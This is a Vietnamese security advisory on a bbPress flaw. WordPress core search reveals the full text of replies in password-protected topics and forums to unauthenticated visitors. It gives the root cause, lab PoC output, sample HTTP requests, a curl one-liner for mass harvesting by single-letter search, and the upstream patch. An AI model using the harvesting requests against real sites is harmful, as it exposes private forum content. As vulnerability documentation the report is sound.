# Lỗ hổng: lộ nội dung reply trong topic/forum đặt mật khẩu qua WordPress search

**Mức độ: High — CVSS 3.1: 7.5**
`CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N`

Đây là bug thật, tái lập được trên checkout local (`bbPress 2.7.0-alpha-4`,
base `7ba66af`) và đã được vá ở upstream bằng commit `e0547e55` (SVN r8057,
`Common: Inherit forum password requirements`, `@since 2.6.21`). Snapshot local
**chưa có** bản vá này.

## Tóm tắt

Khi một topic hoặc forum được bảo vệ bằng mật khẩu (`post_password`), bbPress
ẩn nội dung trên trang reply/topic và chặn REST. Tuy nhiên **WordPress core
search** (`/?s=<từ khóa>&post_type=reply`) vẫn render **toàn bộ nội dung reply**
trong `.entry-content` cho khách chưa đăng nhập, vì WordPress chỉ kiểm tra mật
khẩu của chính post đó, không kiểm tra topic/forum cha.

Hệ quả: ai cũng có thể đọc nguyên văn reply trong các topic/forum private bằng
mật khẩu, thậm chí liệt kê hàng loạt bằng một từ khóa phổ biến.

## Ảnh hưởng

| Thành phần | Giá trị |
| --- | --- |
| Sản phẩm | bbPress (plugin WordPress) |
| Phiên bản | `<= 2.6.20`, trunk trước r8057; local `2.7.0-alpha-4` |
| Điều kiện | Có topic/forum đặt `post_password`; search bật (mặc định) |
| Quyền cần | Không — unauthenticated |
| Tác động | Confidentiality: High (đọc full reply body) |
| Đã vá | upstream `e0547e55` / r8057 (`2.6.21`) |

## Nguyên nhân gốc

`bbp_get_password_required_id()` trong `src/includes/common/template.php` biết
cách kiểm tra topic/forum cha, nhưng chỉ được các template của bbPress dùng
(`bbp_get_topic_content()`, `bbp_get_reply_content()`, feed, REST controller…).

WordPress core dùng `post_password_required( $post )`, và hàm này **không** đi
lên ancestor. Vì vậy khi core search loop gọi `the_content()` cho một reply:

- reply không có `post_password` trực tiếp → core cho rằng không cần mật khẩu;
- topic/forum cha có mật khẩu → bbPress không can thiệp vào core loop;
- template search của theme in `entry-content` → lộ toàn bộ reply.

Local thiếu hai thay đổi của upstream:

1. recursion guard + chuẩn hóa ID trong `bbp_get_password_required_id()`;
2. filter `post_password_required` → `bbp_filter_post_password_required()` và
   hook trong `src/includes/core/filters.php`.

Xem diff đầy đủ: `evidence/upstream-password-fix-diff.txt`.

## Tái lập

Chạy PoC (tự tạo fixture, kiểm tra control, rồi kiểm chứng fix):

```sh
cd lab
./bin/password-reply-search-poc.sh --verify-fix
```

Output thật (`evidence/bbpress-password-reply-search.txt`):

```text
-- control: direct reply page must not render the body --
  [ok] direct page hides the reply body
-- control: REST single reply must be denied --
  [ok] REST single reply -> HTTP 401

-- vulnerable path: unauthenticated core search --
  [VULNERABLE] password-protected topic: full reply body disclosed (2 match)
  [VULNERABLE] password-protected forum: full reply body disclosed (1 match)
-- controls: private and hidden replies stay excluded --
  private reply matches: 0 (expected 0)
  hidden reply matches:  0 (expected 0)

-- verify root cause with the upstream password-inheritance filter --
  after fix: topic reply matches=0, forum reply matches=0 (expected 0/0)

RESULT: VULNERABLE
CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N = 7.5 (High)
```

Request thủ công:

```http
GET /?s=REPLY_SECRET&post_type=reply HTTP/1.1
Host: 127.0.0.1:8899
```

Response chứa:

```html
<h2 class="wp-block-post-title"><a href="/?reply=...">POC Reply In Protected Topic</a></h2>
<div class="entry-content ..."><p>REPLY_SECRET_poc17924891239478</p></div>
```

Trong khi đó request trực tiếp `/?reply=<slug>` chỉ trả về form mật khẩu, và
`/?rest_route=/wp/v2/reply/<id>` trả `401 rest_forbidden`.

## Vì sao private/hidden không bị

Reply trong forum `private`/`hidden` bị loại bởi filter visibility
(`bbp_get_excluded_forum_ids`, `_bbp_public_topic_replies`) nên search không
trả về. Lỗi chỉ xảy ra với **password-protected** topic/forum vì chúng vẫn
`publish` và không nằm trong danh sách excluded.

## Khai thác hàng loạt

Không cần biết trước nội dung. Chỉ cần một từ khóa phổ biến:

```sh
curl 'http://127.0.0.1:8899/?s=e&post_type=reply'
```

Kết quả trả về các reply khớp chữ “e”, gồm cả reply trong topic/forum đặt mật
khẩu, kèm nguyên văn body. Kẻ tấn công có thể lặp qua các chữ cái/từ điển để
thu thập nội dung.

## Bản vá

Upstream `e0547e55` (r8057) sửa đúng lớp lỗi này:

1. `src/includes/common/template.php` — thêm recursion guard và chuẩn hóa ID
   trong `bbp_get_password_required_id()`:

```php
static $checking_id = 0;

if ( ! empty( $post ) && ( $checking_id === (int) $post->ID ) ) {
    return 0;
}

// ...
foreach ( array_unique( array_map( 'intval', array_filter( $post_ids ) ) ) as $post_id ) {
    $previous_id = $checking_id;
    $checking_id = $post_id;

    try {
        $required = post_password_required( $post_id );
    } finally {
        $checking_id = $previous_id;
    }

    if ( $required ) {
        return $post_id;
    }
}
```

2. Thêm filter cầu nối cho WordPress core:

```php
function bbp_filter_post_password_required( $required, $post = null ) {
    if ( $required || ! ( $post instanceof WP_Post ) || ! bbp_is_custom_post_type( $post ) ) {
        return $required;
    }

    return ( 0 !== bbp_get_password_required_id( $post ) );
}
```

3. Hook trong `src/includes/core/filters.php`:

```php
add_filter( 'post_password_required', 'bbp_filter_post_password_required', 10, 2 );
```

4. Regression test upstream:
   `tests/phpunit/testcases/replies/password-visibility.php` (archive, search,
   role, password cookie, nested password).

Không nên chỉ thêm filter mà bỏ qua recursion guard: filter gọi
`bbp_get_password_required_id()`, hàm này lại gọi `post_password_required()`
trên ancestor, có thể đệ quy vô hạn nếu không có guard.

## Giảm thiểu tạm thời

- Tắt search cho khách (`bbp_allow_search` theo role) hoặc chặn
  `?post_type=reply&s=...` ở WAF.
- Không dùng `post_password` cho nội dung nhạy cảm; dùng forum `private`/`hidden`
  (đã được lọc đúng) hoặc phân quyền theo role.
- Áp dụng bản vá r8057 khi nâng cấp lên 2.6.21/2.7.

## Bằng chứng & tái lập

| Tệp | Nội dung |
| --- | --- |
| `bin/password-reply-search-poc.sh` | PoC tự động, có `--verify-fix` |
| `fixtures/password-reply-search.php` | Tạo topic/forum password + control private/hidden |
| `fixtures/password-inherit-proof.php` | Filter chứng minh root cause (không ship) |
| `evidence/bbpress-password-reply-search.txt` | Output PoC đầy đủ |
| `evidence/upstream-password-fix-diff.txt` | Diff local vs upstream r8057 |

Xóa fixture sau khi thử (tuỳ chọn):

```sh
bin/php bin/wp-cli.phar post list --post_type=forum,topic,reply --post_status=any \
  --fields=ID,post_title --path=/workspace/lab/wordpress | grep 'POC '
```

## Ghi chú

- Đây là lỗi **confidentiality** độc lập với các lỗi RCE/leo quyền đã thử trước.
- CVSS 7.5 dựa trên: mạng, độ phức tạp thấp, không cần quyền, không cần tương
  tác, scope unchanged, confidentiality high (đọc full body, khai thác hàng loạt).
  Nếu chỉ tính một reply đơn lẻ, điểm thấp nhất vẫn là 5.3 (C:L) — vẫn > 5.0.
- Local checkout đứng sau upstream vài chục commit; nhiều bản vá bảo mật khác
  (old-slug redirect, reply feed, attachment visibility) cũng chưa có. Nên đồng
  bộ với upstream trước khi phát hành.

